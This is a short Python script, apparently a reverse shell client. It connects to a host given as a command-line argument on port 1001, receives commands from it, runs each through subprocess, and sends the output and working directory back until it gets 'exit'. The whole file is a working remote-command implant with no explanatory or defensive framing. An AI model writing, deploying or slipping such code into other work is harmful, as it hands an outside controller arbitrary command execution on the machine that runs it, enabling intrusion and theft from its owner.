import os
import sys
import subprocess
import socket


client = socket.socket()

client.connect((sys.argv[1], 1001))


cwd = os.getcwd()

client.send(cwd.encode())


while True:
    command = client.recv(1024*128).decode()

    if command.lower() == "exit":
        break

    output = subprocess.getoutput(command)
    cwd = os.getcwd()

    message = f"{cwd}'<sep>'{output}"
    client.send(message.encode())

client.close()
